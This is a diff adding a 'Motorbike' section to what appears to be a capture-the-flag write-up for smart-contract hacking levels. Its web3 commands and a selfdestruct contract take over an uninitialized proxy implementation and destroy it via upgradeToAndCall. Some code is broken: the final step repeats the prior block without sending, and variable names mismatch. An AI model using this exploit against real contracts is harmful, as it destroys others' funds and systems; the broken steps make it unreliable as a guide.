@@ -361,3 +361,89 @@ Withdraw  and set max balance and submit
 await contract.execute(player, toWei('0.002'), 0x0)
 await contract.setMaxBalance(player)
 ```
+
+
+## Motorbike
+To solve this level we would need to get the strage 
+```
+implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+
+```
+We remove the 0 pading 
+```
+implAddr = '0x' + implAddr.slice(-40)
+
+```
+Encoded the function signature 
+```
+initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
+
+await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
+
+pgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
+
+await web3.eth.call({from: player, to: implAddr, data: upgraderSig}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()
+
+```
+
+then we write a simple smart contract 
+```
+pragma solidity <0.7.0;
+
+contract BombEngine {
+    function explode() public {
+        selfdestruct(address(0));
+    }
+}
+```
+
+Then do this 
+```
+bombAddr = '<BombEngine-instance-address>'
+explodeData = web3.eth.abi.encodeFunctionSignature("explode()")
+
+upgradeSignature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'newImplementation'
+        },
+        {
+            type: 'bytes',
+            name: 'data'
+        }
+    ]
+}
+
+upgradeParams = [bombAddr, explodeData]
+
+upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
+
+```
+Then send the transaction 
+```
+bombAddr = '<BombEngine-instance-address>'
+explodeData = web3.eth.abi.encodeFunctionSignature("explode()")
+
+upgradeSignature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'newImplementation'
+        },
+        {
+            type: 'bytes',
+            name: 'data'
+        }
+    ]
+}
+
+upgradeParams = [bombAddr, explodeData]
+
+upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
+```
+You passed
